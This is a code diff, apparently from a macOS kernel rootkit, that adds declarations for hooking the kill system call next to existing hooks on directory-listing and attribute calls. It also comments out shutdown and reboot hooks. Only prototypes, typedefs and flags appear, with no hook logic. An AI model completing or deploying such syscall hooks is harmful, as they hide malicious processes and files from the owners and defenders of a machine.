@@ -134,6 +134,7 @@ void (*i_proc_list_unlock)(void)          = NULL;
 static int fl_getdire           = 0;
 static int fl_getdire64         = 0;
 static int fl_getdirentriesattr = 0;
+static int fl_kill              = 0;
 //static int fl_shutdown          = 0;
 //static int fl_reboot            = 0;
 
@@ -173,6 +174,10 @@ int  hook_read                      (struct proc *,
                                      struct mk_read_args *,
                                      int *);
 #endif
+
+int  hook_kill                      (struct proc *,
+                                     struct mk_kill_args *,
+                                     int *);
 int  hook_getdirentries             (struct proc *,
                                      struct mk_getdirentries_args *,
                                      int *);
@@ -182,13 +187,17 @@ int  hook_getdirentries64           (struct proc *,
 int  hook_getattrlist               (struct proc *,
                                      struct mk_getattrlist_args *,
                                      int *);
+/*
 int hook_shutdown                   (struct proc *,
                                      struct mk_shutdown_args *,
                                      int *);
 int hook_reboot                     (struct proc *,
                                      struct mk_reboot_args *,
                                      int *);
-
+*/
+typedef int kill_func_t             (struct proc *,
+                                     struct mk_kill_args *,
+                                     int *);
 typedef int	read_func_t             (struct proc *,
                                      struct mk_read_args *,
                                      int *);
@@ -204,14 +213,16 @@ typedef int getattrlist_func_t      (struct proc *,
 typedef int getdirentriesattr_func_t(struct proc *,
                                      struct mk_getdirentriesattr_args *,
                                      int *);
+/*
 typedef int shutdown_func_t         (struct proc *,
                                      struct mk_shutdown_args *,
                                      int *);
 typedef int reboot_func_t           (struct proc *,
                                      struct mk_reboot_args *,
                                      int *);
-
+*/
 //static read_func_t              *real_read;
+static kill_func_t              *real_kill;
 static getdirentries_func_t     *real_getdirentries;
 static getdirentries64_func_t   *real_getdirentries64;
 static getdirentriesattr_func_t *real_getdirentriesattr;
